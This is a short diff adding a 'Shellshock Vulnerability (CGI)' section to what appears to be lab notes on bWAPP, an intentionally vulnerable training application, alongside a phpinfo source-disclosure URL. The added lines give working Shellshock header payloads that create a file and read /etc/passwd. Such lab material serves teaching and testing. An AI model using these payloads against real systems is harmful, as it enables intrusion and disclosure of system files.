@@ -492,3 +492,11 @@ There is also possibility to display source code
 http://192.168.1.20/bWAPP/admin/phpinfo.php?-s
 ```
 
+### Shellshock Vulnerability (CGI)
+Modify /bWAPP/cgi-bin/shellshock.sh request
+```
+Referer: () { nothing;}; /bin/touch /tmp/malicious
+```
+```
+Referer: () { nothing;}; echo; /bin/cat /etc/passwd
+```
